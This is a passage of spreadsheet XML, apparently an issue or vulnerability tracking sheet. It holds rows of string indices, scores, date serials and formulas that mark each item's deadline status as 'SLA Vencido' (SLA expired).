      <c r="M71" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N71" s="42">
        <v>3.7000000476837158</v>
      </c>
      <c r="O71" s="6"/>
      <c r="P71" s="10"/>
      <c r="Q71" s="6" t="s">
        <v>2369</v>
      </c>
      <c r="R71" s="22" t="s">
        <v>1426</v>
      </c>
      <c r="S71" s="22"/>
      <c r="T71" s="8">
        <v>44811.811331018522</v>
      </c>
      <c r="U71" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>1397.1886689814783</v>
      </c>
      <c r="V71" s="8">
        <f t="shared" si="4"/>
        <v>44931.811331018522</v>
      </c>
      <c r="W71" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X71" s="11"/>
      <c r="Y71" s="11"/>
      <c r="Z71" s="11"/>
      <c r="AA71" s="8"/>
      <c r="AB71" s="9" t="s">
        <v>2370</v>
      </c>
      <c r="AC71" s="32" t="s">
        <v>2371</v>
      </c>
      <c r="AD71" s="32" t="s">
        <v>2372</v>
      </c>
      <c r="AE71" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF71" s="9"/>
      <c r="AG71" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="72" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A72" s="5">
        <v>71</v>
      </c>
      <c r="B72" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C72" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D72" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E72" s="4"/>
      <c r="F72" s="4"/>
      <c r="G72" s="6" t="s">
        <v>2053</v>
      </c>
      <c r="H72" s="4" t="s">
        <v>2373</v>
      </c>
      <c r="I72" s="6" t="s">
        <v>2374</v>
      </c>
      <c r="J72" s="4" t="s">
        <v>2375</v>
      </c>
      <c r="K72" s="4"/>
      <c r="L72" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M72" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N72" s="42">
        <v>3.7000000476837158</v>
      </c>
      <c r="O72" s="6"/>
      <c r="P72" s="10"/>
      <c r="Q72" s="6" t="s">
        <v>2289</v>
      </c>
      <c r="R72" s="22"/>
      <c r="S72" s="22"/>
      <c r="T72" s="8">
        <v>44816.785798611112</v>
      </c>
      <c r="U72" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>1392.2142013888879</v>
      </c>
      <c r="V72" s="8">
        <f t="shared" si="4"/>
        <v>44936.785798611112</v>
      </c>
      <c r="W72" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X72" s="11"/>
      <c r="Y72" s="11"/>
      <c r="Z72" s="11"/>
      <c r="AA72" s="8"/>
      <c r="AB72" s="9" t="s">
        <v>2376</v>
      </c>
      <c r="AC72" s="32" t="s">
        <v>2377</v>
      </c>
      <c r="AD72" s="32" t="s">
        <v>2378</v>
      </c>
      <c r="AE72" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF72" s="65" t="s">
        <v>2095</v>
      </c>
      <c r="AG72" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="73" spans="1:33" ht="102.75" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A73" s="5">
        <v>72</v>
      </c>
      <c r="B73" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C73" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D73" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E73" s="4"/>
      <c r="F73" s="4"/>
      <c r="G73" s="6" t="s">
        <v>2053</v>
      </c>
      <c r="H73" s="4" t="s">
        <v>2379</v>
      </c>
      <c r="I73" s="6" t="s">
        <v>2380</v>
      </c>
      <c r="J73" s="4" t="s">
        <v>750</v>
      </c>
      <c r="K73" s="4"/>
      <c r="L73" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M73" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N73" s="42">
        <v>3.7000000476837158</v>
      </c>
      <c r="O73" s="6"/>
      <c r="P73" s="6"/>
      <c r="Q73" s="6" t="s">
        <v>2289</v>
      </c>
      <c r="R73" s="22"/>
      <c r="S73" s="22"/>
      <c r="T73" s="8">
        <v>44816.787615740737</v>
      </c>
      <c r="U73" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>1392.2123842592628</v>
      </c>
      <c r="V73" s="8">
        <f t="shared" si="4"/>
        <v>44936.787615740737</v>
      </c>
      <c r="W73" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X73" s="11"/>
      <c r="Y73" s="11"/>
      <c r="Z73" s="11"/>
      <c r="AA73" s="8"/>
      <c r="AB73" s="9" t="s">
        <v>2381</v>
      </c>
      <c r="AC73" s="32" t="s">
        <v>2382</v>
      </c>
      <c r="AD73" s="32" t="s">
        <v>2383</v>
      </c>
      <c r="AE73" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF73" s="65" t="s">
        <v>2095</v>
      </c>
      <c r="AG73" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="74" spans="1:33" ht="203" x14ac:dyDescent="0.35">
      <c r="A74" s="5">
        <v>73</v>
      </c>
      <c r="B74" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C74" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D74" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E74" s="4"/>
      <c r="F74" s="4"/>
      <c r="G74" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H74" s="4" t="s">
        <v>2384</v>
      </c>
      <c r="I74" s="6" t="s">
        <v>2385</v>
      </c>
      <c r="J74" s="4" t="s">
        <v>2386</v>
      </c>
      <c r="K74" s="4"/>
      <c r="L74" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M74" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N74" s="42">
        <v>3.4000000953674316</v>
      </c>
      <c r="O74" s="6"/>
      <c r="P74" s="6"/>
      <c r="Q74" s="6" t="s">
        <v>2172</v>
      </c>
      <c r="R74" s="22" t="s">
        <v>2263</v>
      </c>
      <c r="S74" s="22"/>
      <c r="T74" s="8">
        <v>45195.532916666663</v>
      </c>
      <c r="U74" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>1013.4670833333366</v>
      </c>
      <c r="V74" s="8">
        <f t="shared" si="4"/>
        <v>45315.532916666663</v>
      </c>
      <c r="W74" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X74" s="11"/>
      <c r="Y74" s="11"/>
      <c r="Z74" s="11"/>
      <c r="AA74" s="8"/>
      <c r="AB74" s="9" t="s">
        <v>2387</v>
      </c>
      <c r="AC74" s="32" t="s">
        <v>2388</v>
      </c>
      <c r="AD74" s="32" t="s">
        <v>2389</v>
      </c>
      <c r="AE74" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF74" s="9"/>
      <c r="AG74" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="75" spans="1:33" ht="69" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A75" s="5">
        <v>74</v>
      </c>
      <c r="B75" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C75" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D75" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E75" s="4"/>
      <c r="F75" s="4"/>
      <c r="G75" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H75" s="4" t="s">
        <v>2390</v>
      </c>
      <c r="I75" s="6" t="s">
        <v>2391</v>
      </c>
      <c r="J75" s="4" t="s">
        <v>214</v>
      </c>
      <c r="K75" s="4"/>
      <c r="L75" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M75" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N75" s="42">
        <v>3.2000000476837158</v>
      </c>
      <c r="O75" s="6"/>
      <c r="P75" s="6"/>
      <c r="Q75" s="6" t="s">
        <v>2172</v>
      </c>
      <c r="R75" s="22" t="s">
        <v>2263</v>
      </c>
      <c r="S75" s="22"/>
      <c r="T75" s="8">
        <v>45195.536446759259</v>
      </c>
      <c r="U75" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>1013.463553240741</v>
      </c>
      <c r="V75" s="8">
        <f t="shared" si="4"/>
        <v>45315.536446759259</v>
      </c>
      <c r="W75" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X75" s="11"/>
      <c r="Y75" s="11"/>
      <c r="Z75" s="11"/>
      <c r="AA75" s="8"/>
      <c r="AB75" s="9" t="s">
        <v>2392</v>
      </c>
      <c r="AC75" s="32" t="s">
        <v>2393</v>
      </c>
      <c r="AD75" s="32" t="s">
        <v>2394</v>
      </c>
      <c r="AE75" s="27" t="s">
        <v>2132</v>
      </c>
      <c r="AF75" s="9" t="s">
        <v>2133</v>
      </c>
      <c r="AG75" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="76" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A76" s="5">
        <v>75</v>
      </c>
      <c r="B76" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C76" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D76" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E76" s="4"/>
      <c r="F76" s="4"/>
      <c r="G76" s="6" t="s">
        <v>2158</v>
      </c>
      <c r="H76" s="4" t="s">
        <v>2395</v>
      </c>
      <c r="I76" s="6" t="s">
        <v>2396</v>
      </c>
      <c r="J76" s="4" t="s">
        <v>910</v>
      </c>
      <c r="K76" s="4"/>
      <c r="L76" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M76" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N76" s="42">
        <v>3.5999999046325684</v>
      </c>
      <c r="O76" s="6"/>
      <c r="P76" s="6"/>
      <c r="Q76" s="6" t="s">
        <v>2162</v>
      </c>
      <c r="R76" s="22" t="s">
        <v>1426</v>
      </c>
      <c r="S76" s="22"/>
      <c r="T76" s="8">
        <v>45195.59337962963</v>
      </c>
      <c r="U76" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>1013.4066203703696</v>
      </c>
      <c r="V76" s="8">
        <f t="shared" si="4"/>
        <v>45315.59337962963</v>
      </c>
      <c r="W76" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X76" s="11"/>
      <c r="Y76" s="11"/>
      <c r="Z76" s="11"/>
      <c r="AA76" s="8">
        <v>45756</v>
      </c>
      <c r="AB76" s="9" t="s">
        <v>2397</v>
      </c>
      <c r="AC76" s="32" t="s">
        <v>1183</v>
      </c>
      <c r="AD76" s="32" t="s">
        <v>1216</v>
      </c>
      <c r="AE76" s="4"/>
      <c r="AF76" s="9"/>
      <c r="AG76" s="27" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="77" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A77" s="5">
        <v>76</v>
      </c>
      <c r="B77" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C77" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D77" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E77" s="4"/>
      <c r="F77" s="4"/>
      <c r="G77" s="6" t="s">
        <v>2158</v>
      </c>
      <c r="H77" s="4" t="s">
        <v>2398</v>
      </c>
      <c r="I77" s="6" t="s">
        <v>2399</v>
      </c>
      <c r="J77" s="4" t="s">
        <v>2400</v>
      </c>
      <c r="K77" s="4"/>
      <c r="L77" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M77" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N77" s="42">
        <v>3.5999999046325684</v>
      </c>
      <c r="O77" s="6"/>
      <c r="P77" s="6"/>
      <c r="Q77" s="6" t="s">
        <v>2162</v>
      </c>
      <c r="R77" s="22" t="s">
        <v>1426</v>
      </c>
      <c r="S77" s="22"/>
      <c r="T77" s="8">
        <v>45195.598865740743</v>
      </c>
      <c r="U77" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>1013.4011342592567</v>
      </c>
      <c r="V77" s="8">
        <f t="shared" si="4"/>
        <v>45315.598865740743</v>
      </c>
      <c r="W77" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X77" s="11"/>
      <c r="Y77" s="11"/>
      <c r="Z77" s="11"/>
      <c r="AA77" s="8">
        <v>45756</v>
      </c>
      <c r="AB77" s="9" t="s">
        <v>2401</v>
      </c>
      <c r="AC77" s="32" t="s">
        <v>1713</v>
      </c>
      <c r="AD77" s="32" t="s">
        <v>2402</v>
      </c>
      <c r="AE77" s="4"/>
      <c r="AF77" s="9"/>
      <c r="AG77" s="27" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="78" spans="1:33" ht="232" x14ac:dyDescent="0.35">
      <c r="A78" s="5">
        <v>77</v>
      </c>
      <c r="B78" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C78" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D78" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E78" s="4"/>
      <c r="F78" s="4"/>
      <c r="G78" s="6" t="s">
        <v>2096</v>
      </c>
      <c r="H78" s="4" t="s">
        <v>2403</v>
      </c>
      <c r="I78" s="6" t="s">
        <v>2404</v>
      </c>
      <c r="J78" s="4" t="s">
        <v>1271</v>
      </c>
      <c r="K78" s="4"/>
      <c r="L78" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M78" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N78" s="42">
        <v>3.7000000476837158</v>
      </c>
      <c r="O78" s="6"/>
      <c r="P78" s="4"/>
      <c r="Q78" s="6" t="s">
        <v>2154</v>
      </c>
      <c r="R78" s="22"/>
      <c r="S78" s="22"/>
      <c r="T78" s="8">
        <v>45201.629363425927</v>
      </c>
      <c r="U78" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>1007.3706365740727</v>
      </c>
      <c r="V78" s="8">
        <f t="shared" si="4"/>
        <v>45321.629363425927</v>
      </c>
      <c r="W78" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X78" s="12"/>
      <c r="Y78" s="12"/>
      <c r="Z78" s="12"/>
      <c r="AA78" s="8"/>
      <c r="AB78" s="9" t="s">
        <v>2405</v>
      </c>
      <c r="AC78" s="32" t="s">
        <v>2406</v>
      </c>
      <c r="AD78" s="35" t="s">
        <v>1274</v>
      </c>
      <c r="AE78" s="8" t="s">
        <v>1384</v>
      </c>
      <c r="AF78" s="27"/>
      <c r="AG78" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="79" spans="1:33" ht="69" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A79" s="5">
        <v>78</v>
      </c>
      <c r="B79" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C79" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D79" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E79" s="4"/>
      <c r="F79" s="4"/>
      <c r="G79" s="6" t="s">
        <v>2096</v>
      </c>
      <c r="H79" s="4" t="s">
        <v>2407</v>
      </c>
      <c r="I79" s="6" t="s">
        <v>2408</v>
      </c>
      <c r="J79" s="4" t="s">
        <v>80</v>
      </c>
      <c r="K79" s="4"/>
      <c r="L79" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M79" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N79" s="42">
        <v>3.7000000476837158</v>
      </c>
      <c r="O79" s="6"/>
      <c r="P79" s="4"/>
      <c r="Q79" s="6" t="s">
        <v>2154</v>
      </c>
      <c r="R79" s="22"/>
      <c r="S79" s="22"/>
      <c r="T79" s="8">
        <v>45201.630740740744</v>
      </c>
      <c r="U79" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>1007.3692592592561</v>
      </c>
      <c r="V79" s="8">
        <f t="shared" si="4"/>
        <v>45321.630740740744</v>
      </c>
      <c r="W79" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X79" s="12"/>
      <c r="Y79" s="30"/>
      <c r="Z79" s="30"/>
      <c r="AA79" s="8"/>
      <c r="AB79" s="9" t="s">
        <v>2409</v>
      </c>
      <c r="AC79" s="32" t="s">
        <v>2357</v>
      </c>
      <c r="AD79" s="32" t="s">
        <v>2358</v>
      </c>
      <c r="AE79" s="27" t="s">
        <v>2410</v>
      </c>
      <c r="AF79" s="9"/>
      <c r="AG79" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="80" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A80" s="5">
        <v>79</v>
      </c>
      <c r="B80" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C80" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D80" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E80" s="4"/>
      <c r="F80" s="4"/>
      <c r="G80" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H80" s="4" t="s">
        <v>2411</v>
      </c>
      <c r="I80" s="6" t="s">
        <v>2412</v>
      </c>
      <c r="J80" s="4" t="s">
        <v>1469</v>
      </c>
      <c r="K80" s="4"/>
      <c r="L80" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M80" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N80" s="42">
        <v>3.7000000476837158</v>
      </c>
      <c r="O80" s="6"/>
      <c r="P80" s="10"/>
      <c r="Q80" s="6" t="s">
        <v>2089</v>
      </c>
      <c r="R80" s="22"/>
      <c r="S80" s="22"/>
      <c r="T80" s="4">
        <v>45202.623599537037</v>
      </c>
      <c r="U80" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>1006.3764004629629</v>
      </c>
      <c r="V80" s="8">
        <f t="shared" si="4"/>
        <v>45322.623599537037</v>
      </c>
      <c r="W80" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X80" s="11"/>
      <c r="Y80" s="11"/>
      <c r="Z80" s="11"/>
      <c r="AA80" s="8"/>
      <c r="AB80" s="9" t="s">
        <v>2413</v>
      </c>
      <c r="AC80" s="32" t="s">
        <v>2414</v>
      </c>
      <c r="AD80" s="32" t="s">
        <v>2415</v>
      </c>
      <c r="AE80" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF80" s="9"/>
      <c r="AG80" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="81" spans="1:33" ht="217.5" x14ac:dyDescent="0.35">
      <c r="A81" s="5">
        <v>80</v>
      </c>
      <c r="B81" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C81" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D81" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E81" s="4"/>
      <c r="F81" s="4"/>
      <c r="G81" s="6" t="s">
        <v>2045</v>
      </c>
      <c r="H81" s="4" t="s">
        <v>2416</v>
      </c>
      <c r="I81" s="6" t="s">
        <v>2417</v>
      </c>
      <c r="J81" s="4" t="s">
        <v>2418</v>
      </c>
      <c r="K81" s="4"/>
      <c r="L81" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M81" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N81" s="42">
        <v>3.7000000476837158</v>
      </c>
      <c r="O81" s="6"/>
      <c r="P81" s="10"/>
      <c r="Q81" s="4" t="s">
        <v>2321</v>
      </c>
      <c r="R81" s="22"/>
      <c r="S81" s="22"/>
      <c r="T81" s="8">
        <v>45223.622152777774</v>
      </c>
      <c r="U81" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>985.37784722222568</v>
      </c>
      <c r="V81" s="8">
        <f t="shared" si="4"/>
        <v>45343.622152777774</v>
      </c>
      <c r="W81" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X81" s="11"/>
      <c r="Y81" s="11"/>
      <c r="Z81" s="11"/>
      <c r="AA81" s="8"/>
      <c r="AB81" s="9" t="s">
        <v>2419</v>
      </c>
      <c r="AC81" s="32" t="s">
        <v>2420</v>
      </c>
      <c r="AD81" s="32" t="s">
        <v>1274</v>
      </c>
      <c r="AE81" s="4" t="s">
        <v>1384</v>
      </c>
      <c r="AF81" s="4"/>
      <c r="AG81" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="82" spans="1:33" ht="92.25" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A82" s="5">
        <v>81</v>
      </c>
      <c r="B82" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C82" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D82" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E82" s="4"/>
      <c r="F82" s="4"/>
      <c r="G82" s="6" t="s">
        <v>2239</v>
      </c>
      <c r="H82" s="4" t="s">
        <v>2421</v>
      </c>
      <c r="I82" s="6" t="s">
        <v>2422</v>
      </c>
      <c r="J82" s="4" t="s">
        <v>214</v>
      </c>
      <c r="K82" s="4"/>
      <c r="L82" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M82" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N82" s="42">
        <v>3.7000000476837158</v>
      </c>
      <c r="O82" s="6"/>
      <c r="P82" s="4"/>
      <c r="Q82" s="6" t="s">
        <v>2369</v>
      </c>
      <c r="R82" s="22" t="s">
        <v>1426</v>
      </c>
      <c r="S82" s="22"/>
      <c r="T82" s="8">
        <v>45232.720613425925</v>
      </c>
      <c r="U82" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>976.27938657407503</v>
      </c>
      <c r="V82" s="8">
        <f t="shared" si="4"/>
        <v>45352.720613425925</v>
      </c>
      <c r="W82" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X82" s="12"/>
      <c r="Y82" s="12"/>
      <c r="Z82" s="12"/>
      <c r="AA82" s="8"/>
      <c r="AB82" s="9" t="s">
        <v>2423</v>
      </c>
      <c r="AC82" s="32" t="s">
        <v>2393</v>
      </c>
      <c r="AD82" s="32" t="s">
        <v>2394</v>
      </c>
      <c r="AE82" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF82" s="27"/>
      <c r="AG82" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="83" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A83" s="5">
        <v>82</v>
      </c>
      <c r="B83" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C83" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D83" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E83" s="4"/>
      <c r="F83" s="4"/>
      <c r="G83" s="6" t="s">
        <v>2239</v>
      </c>
      <c r="H83" s="4" t="s">
        <v>2424</v>
      </c>
      <c r="I83" s="6" t="s">
        <v>2425</v>
      </c>
      <c r="J83" s="4" t="s">
        <v>2426</v>
      </c>
      <c r="K83" s="4"/>
      <c r="L83" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M83" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N83" s="42">
        <v>3.7000000476837158</v>
      </c>
      <c r="O83" s="6"/>
      <c r="P83" s="6"/>
      <c r="Q83" s="6" t="s">
        <v>2243</v>
      </c>
      <c r="R83" s="22" t="s">
        <v>1426</v>
      </c>
      <c r="S83" s="22"/>
      <c r="T83" s="4">
        <v>45439.530023148145</v>
      </c>
      <c r="U83" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>769.46997685185488</v>
      </c>
      <c r="V83" s="8">
        <f t="shared" si="4"/>
        <v>45559.530023148145</v>
      </c>
      <c r="W83" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X83" s="11"/>
      <c r="Y83" s="11"/>
      <c r="Z83" s="11"/>
      <c r="AA83" s="8"/>
      <c r="AB83" s="9" t="s">
        <v>2427</v>
      </c>
      <c r="AC83" s="32" t="s">
        <v>1170</v>
      </c>
      <c r="AD83" s="32" t="s">
        <v>1216</v>
      </c>
      <c r="AE83" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF83" s="9"/>
      <c r="AG83" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="84" spans="1:33" ht="261" x14ac:dyDescent="0.35">
      <c r="A84" s="5">
        <v>83</v>
      </c>
      <c r="B84" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C84" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D84" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E84" s="4"/>
      <c r="F84" s="4"/>
      <c r="G84" s="6" t="s">
        <v>2045</v>
      </c>
      <c r="H84" s="4" t="s">
        <v>2428</v>
      </c>
      <c r="I84" s="6" t="s">
        <v>2429</v>
      </c>
      <c r="J84" s="4" t="s">
        <v>1042</v>
      </c>
      <c r="K84" s="4"/>
      <c r="L84" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M84" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N84" s="42">
        <v>3.7000000476837158</v>
      </c>
      <c r="O84" s="6"/>
      <c r="P84" s="4"/>
      <c r="Q84" s="6" t="s">
        <v>2113</v>
      </c>
      <c r="R84" s="22" t="s">
        <v>1426</v>
      </c>
      <c r="S84" s="22"/>
      <c r="T84" s="8">
        <v>45447.677268518521</v>
      </c>
      <c r="U84" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>761.32273148147942</v>
      </c>
      <c r="V84" s="8">
        <f t="shared" si="4"/>
        <v>45567.677268518521</v>
      </c>
      <c r="W84" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X84" s="12"/>
      <c r="Y84" s="30"/>
      <c r="Z84" s="30"/>
      <c r="AA84" s="8"/>
      <c r="AB84" s="9" t="s">
        <v>2430</v>
      </c>
      <c r="AC84" s="32" t="s">
        <v>2431</v>
      </c>
      <c r="AD84" s="32" t="s">
        <v>1046</v>
      </c>
      <c r="AE84" s="27" t="s">
        <v>2080</v>
      </c>
      <c r="AF84" s="27"/>
      <c r="AG84" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="85" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A85" s="5">
        <v>84</v>
      </c>
      <c r="B85" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C85" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D85" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E85" s="4"/>
      <c r="F85" s="4"/>
      <c r="G85" s="6" t="s">
        <v>2045</v>
      </c>
      <c r="H85" s="4" t="s">
        <v>2432</v>
      </c>
      <c r="I85" s="6" t="s">
        <v>2433</v>
      </c>
      <c r="J85" s="4" t="s">
        <v>80</v>
      </c>
      <c r="K85" s="4"/>
      <c r="L85" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M85" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N85" s="42">
        <v>3.7000000476837158</v>
      </c>
      <c r="O85" s="6"/>
      <c r="P85" s="6"/>
      <c r="Q85" s="6" t="s">
        <v>2113</v>
      </c>
      <c r="R85" s="22" t="s">
        <v>1426</v>
      </c>
      <c r="S85" s="22"/>
      <c r="T85" s="8">
        <v>45447.68136574074</v>
      </c>
      <c r="U85" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>761.31863425925985</v>
      </c>
      <c r="V85" s="8">
        <f t="shared" si="4"/>
        <v>45567.68136574074</v>
      </c>
      <c r="W85" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X85" s="11"/>
      <c r="Y85" s="11"/>
      <c r="Z85" s="11"/>
      <c r="AA85" s="8"/>
      <c r="AB85" s="9" t="s">
        <v>2434</v>
      </c>
      <c r="AC85" s="32" t="s">
        <v>2357</v>
      </c>
      <c r="AD85" s="32" t="s">
        <v>2358</v>
      </c>
      <c r="AE85" s="27" t="s">
        <v>2435</v>
      </c>
      <c r="AF85" s="27"/>
      <c r="AG85" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="86" spans="1:33" ht="246.5" x14ac:dyDescent="0.35">
      <c r="A86" s="5">
        <v>85</v>
      </c>
      <c r="B86" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C86" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D86" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E86" s="4"/>
      <c r="F86" s="4"/>
      <c r="G86" s="6" t="s">
        <v>2103</v>
      </c>
      <c r="H86" s="4" t="s">
        <v>2436</v>
      </c>
      <c r="I86" s="6" t="s">
        <v>2437</v>
      </c>
      <c r="J86" s="4" t="s">
        <v>2438</v>
      </c>
      <c r="K86" s="4"/>
      <c r="L86" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M86" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N86" s="42">
        <v>3.5999999046325684</v>
      </c>
      <c r="O86" s="6"/>
      <c r="P86" s="10"/>
      <c r="Q86" s="4" t="s">
        <v>2107</v>
      </c>
      <c r="R86" s="22"/>
      <c r="S86" s="22"/>
      <c r="T86" s="8">
        <v>45449.855914351851</v>
      </c>
      <c r="U86" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>759.14408564814948</v>
      </c>
      <c r="V86" s="8">
        <f t="shared" si="4"/>
        <v>45569.855914351851</v>
      </c>
      <c r="W86" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X86" s="11"/>
      <c r="Y86" s="11"/>
